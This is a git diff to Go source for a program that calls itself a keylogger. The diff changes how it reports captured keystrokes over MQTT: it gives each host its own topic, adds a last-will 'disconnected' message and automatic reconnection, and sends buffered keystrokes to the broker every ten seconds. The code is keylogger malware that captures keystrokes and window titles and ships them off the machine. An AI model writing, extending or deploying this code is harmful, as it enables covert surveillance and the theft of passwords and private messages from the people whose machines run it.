@@ -6,9 +6,10 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+	"log"
+
 	"github.com/AllenDang/w32"
 	"github.com/eclipse/paho.mqtt.golang"
-	"log"
 )
 
 var (
@@ -21,7 +22,7 @@ var (
 	tmpTitle  string
 
 	vClient mqtt.Client
-
+	channel string
 )
 
 var vh mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
@@ -306,15 +307,19 @@ func create(){
 	mqtt.ERROR = log.New(os.Stdout, "", 0)
 
 	hostame, _ := os.Hostname()
+	channel = "client/" + hostame
 	opts := mqtt.NewClientOptions().AddBroker("tcp://127.0.0.1:1883").SetClientID(hostame)
 	opts.SetKeepAlive(2 * time.Second)
 	opts.SetDefaultPublishHandler(vh)
 	opts.SetPingTimeout(1 * time.Second)
+	opts.SetWill(channel,"Host: " + hostame + " disconnected",2,false)
+	opts.AutoReconnect = true
 	vClient = mqtt.NewClient(opts)
 
 	if token := vClient.Connect(); token.Wait() && token.Error() != nil {
 		panic(token.Error())
 	}
+
 }
 
 func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token{
@@ -325,14 +330,14 @@ func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token{
 
 func sendLog(){
 	create()
-	for {
+	for vClient.IsConnected(){
 		time.Sleep(10 * time.Second)
 		if tmpKeylog == ""{
 			fmt.Println("Nothing to show")
 			continue
 		}
 		fmt.Print(tmpKeylog)
-		token := sendMsg("client/laptop", tmpKeylog, byte(0), false)
+		token := sendMsg(channel, tmpKeylog, byte(0), false)
 		if token.Error() != nil {
 			fmt.Println(token.Error())
 			os.Exit(1)
@@ -343,8 +348,6 @@ func sendLog(){
 
 func main() {
 	fmt.Println("Starting KeyLogger!")
-
-
 
 	go keyLogger()
 	go windowLogger()
